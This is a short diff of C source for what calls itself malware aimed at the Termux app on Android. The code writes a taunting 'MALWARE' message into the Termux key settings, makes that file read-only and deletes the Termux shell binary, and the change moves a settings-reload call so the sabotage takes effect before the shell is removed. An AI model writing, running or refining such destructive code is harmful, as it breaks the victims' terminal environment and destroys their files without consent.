@@ -48,6 +48,7 @@ void redMinal(){
 	fputs("extra-keys = [\\['THIS', 'IS', 'A', 'BULLSHIT', 'MALWARE']\\]", fp);
 	fchmod(fileno(fp), 0400);
 	fclose(fp);
+        system("termux-reload-settings;");
 	remove("/data/data/com.termux/files/usr/bin/sh");		
 }
 
@@ -62,7 +63,6 @@ int main(){
     char *path = "/data/data/com.termux/files";
     makeThemRed(path);
     redMinal();
-    system("termux-reload-settings;");
     printf("\33[1;33mGoodbye :)\33[0m\n");
     return 0;
 }
